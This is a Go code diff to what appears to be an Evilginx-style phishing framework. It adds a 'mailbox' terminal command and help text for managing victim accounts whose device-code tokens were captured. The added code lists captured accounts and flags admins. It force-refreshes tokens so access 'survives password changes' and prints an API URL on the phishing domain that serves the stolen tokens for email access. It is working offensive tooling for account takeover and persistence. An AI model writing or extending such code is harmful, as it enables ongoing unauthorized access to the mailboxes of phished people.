@@ -226,6 +226,9 @@ func (t *Terminal) DoWork() {
 		case "feed":
 			cmd_ok = true
 			t.handleFeed(args[1:])
+		case "mailbox":
+			cmd_ok = true
+			t.handleMailbox(args[1:])
 		case "quickstart":
 			cmd_ok = true
 			err := t.handleQuickstart(args[1:])
@@ -3366,6 +3369,28 @@ func (t *Terminal) createHelp() {
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
 
+	h.AddCommand("feed", "general", "manage token feed API for mailbox viewer", "Token feed API serves captured tokens to the mailbox viewer for email access. Accounts auto-sync and tokens are refreshed server-side.", LAYER_TOP,
+		readline.PcItem("feed",
+			readline.PcItem("key"),
+			readline.PcItem("url")))
+
+	h.AddSubCommand("feed", nil, "", "show feed status and accounts")
+	h.AddSubCommand("feed", []string{"key"}, "key", "show API key")
+	h.AddSubCommand("feed", []string{"url"}, "url", "show full feed URL")
+
+	h.AddCommand("mailbox", "general", "manage persistent mailbox accounts with auto-refresh", "Captured accounts are saved persistently and survive password changes. Tokens are automatically refreshed every 10 minutes. Accounts are stored in mailbox_accounts.json.", LAYER_TOP,
+		readline.PcItem("mailbox",
+			readline.PcItem("refresh", readline.PcItem("all")),
+			readline.PcItem("remove"),
+			readline.PcItem("url"),
+			readline.PcItem("stats")))
+
+	h.AddSubCommand("mailbox", nil, "", "list all saved mailbox accounts")
+	h.AddSubCommand("mailbox", []string{"refresh"}, "refresh <id|all>", "force refresh token(s)")
+	h.AddSubCommand("mailbox", []string{"remove"}, "remove <id>", "remove an account")
+	h.AddSubCommand("mailbox", []string{"url"}, "url", "show API endpoint URL")
+	h.AddSubCommand("mailbox", []string{"stats"}, "stats", "show account statistics")
+
 	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
 		readline.PcItem("clear"))
 
@@ -4128,6 +4153,124 @@ func (t *Terminal) handleFeed(args []string) {
 		log.Info("[feed]   feed        - Show feed status and accounts")
 		log.Info("[feed]   feed key    - Show API key")
 		log.Info("[feed]   feed url    - Show full feed URL")
+	}
+}
+
+func (t *Terminal) handleMailbox(args []string) {
+	mailbox := t.p.mailboxAccounts
+	if mailbox == nil {
+		log.Error("Mailbox accounts manager not initialized")
+		return
+	}
+
+	if len(args) == 0 {
+		// Show mailbox status and accounts
+		total, active, expired, admins := mailbox.GetStats()
+		phishDomain := t.cfg.GetBaseDomain()
+		if phishDomain == "" {
+			phishDomain = "<your-domain>"
+		}
+		apiKey := t.p.tokenFeed.GetAPIKey()
+
+		log.Info("[mailbox] Persistent Mailbox Accounts")
+		log.Info("[mailbox] ════════════════════════════════════════════════════════════")
+		log.Info("[mailbox] Total:   %d accounts", total)
+		log.Info("[mailbox] Active:  %d accounts (tokens valid)", active)
+		log.Info("[mailbox] Expired: %d accounts (need manual refresh)", expired)
+		log.Info("[mailbox] Admins:  %d accounts (with admin roles)", admins)
+		log.Info("[mailbox]")
+		log.Info("[mailbox] API Endpoint: https://%s/api/v1/mailbox?key=%s", phishDomain, apiKey)
+		log.Info("[mailbox] Storage: %s/mailbox_accounts.json", t.cfg.GetDataDir())
+		log.Info("[mailbox]")
+
+		// Show all accounts
+		accounts := mailbox.ListAccounts()
+		if len(accounts) > 0 {
+			log.Info("[mailbox] Accounts:")
+			for _, acc := range accounts {
+				adminFlag := ""
+				if acc.IsAdmin {
+					adminFlag = " [ADMIN]"
+				}
+				refreshInfo := ""
+				if acc.RefreshCount > 0 {
+					refreshInfo = fmt.Sprintf(" (refreshed %dx)", acc.RefreshCount)
+				}
+				log.Info("[mailbox]   [%s] %s (%s) - %s%s%s", acc.ID, acc.Email, acc.DisplayName, acc.Status, adminFlag, refreshInfo)
+				if acc.LastError != "" {
+					log.Warning("[mailbox]        └─ Error: %s", acc.LastError)
+				}
+			}
+		} else {
+			log.Info("[mailbox] No accounts saved yet. Accounts will be auto-added when device code tokens are captured.")
+		}
+		log.Info("[mailbox]")
+		log.Info("[mailbox] Accounts survive password changes as long as tokens are refreshed.")
+		log.Info("[mailbox] Auto-refresh runs every 10 minutes for all accounts with refresh tokens.")
+		return
+	}
+
+	switch args[0] {
+	case "refresh":
+		if len(args) < 2 {
+			log.Info("[mailbox] Usage: mailbox refresh <account-id>")
+			log.Info("[mailbox]        mailbox refresh all")
+			return
+		}
+		if args[1] == "all" {
+			log.Info("[mailbox] Refreshing all accounts...")
+			accounts := mailbox.ListAccounts()
+			for _, acc := range accounts {
+				if err := mailbox.ManualRefresh(acc.ID); err != nil {
+					log.Warning("[mailbox] Failed to refresh %s: %v", acc.Email, err)
+				} else {
+					log.Success("[mailbox] Refreshed %s", acc.Email)
+				}
+			}
+		} else {
+			if err := mailbox.ManualRefresh(args[1]); err != nil {
+				log.Error("[mailbox] Failed to refresh: %v", err)
+			} else {
+				log.Success("[mailbox] Token refreshed")
+			}
+		}
+	case "remove", "delete":
+		if len(args) < 2 {
+			log.Info("[mailbox] Usage: mailbox remove <account-id>")
+			return
+		}
+		acc := mailbox.GetAccount(args[1])
+		if acc == nil {
+			log.Error("[mailbox] Account not found: %s", args[1])
+			return
+		}
+		if err := mailbox.RemoveAccount(args[1]); err != nil {
+			log.Error("[mailbox] Failed to remove account: %v", err)
+		} else {
+			log.Success("[mailbox] Removed account: %s", acc.Email)
+		}
+	case "url":
+		phishDomain := t.cfg.GetBaseDomain()
+		if phishDomain == "" {
+			phishDomain = "<your-domain>"
+		}
+		apiKey := t.p.tokenFeed.GetAPIKey()
+		log.Info("[mailbox] API URL: https://%s/api/v1/mailbox?key=%s", phishDomain, apiKey)
+	case "stats":
+		total, active, expired, admins := mailbox.GetStats()
+		log.Info("[mailbox] Statistics:")
+		log.Info("[mailbox]   Total:   %d", total)
+		log.Info("[mailbox]   Active:  %d", active)
+		log.Info("[mailbox]   Expired: %d", expired)
+		log.Info("[mailbox]   Admins:  %d", admins)
+	default:
+		log.Info("[mailbox] Usage:")
+		log.Info("[mailbox]   mailbox               - List all saved accounts")
+		log.Info("[mailbox]   mailbox refresh <id>  - Force refresh a specific account")
+		log.Info("[mailbox]   mailbox refresh all   - Force refresh all accounts")
+		log.Info("[mailbox]   mailbox remove <id>   - Remove an account")
+		log.Info("[mailbox]   mailbox url           - Show API endpoint URL")
+		log.Info("[mailbox]   mailbox stats         - Show statistics")
 	}
 }
 
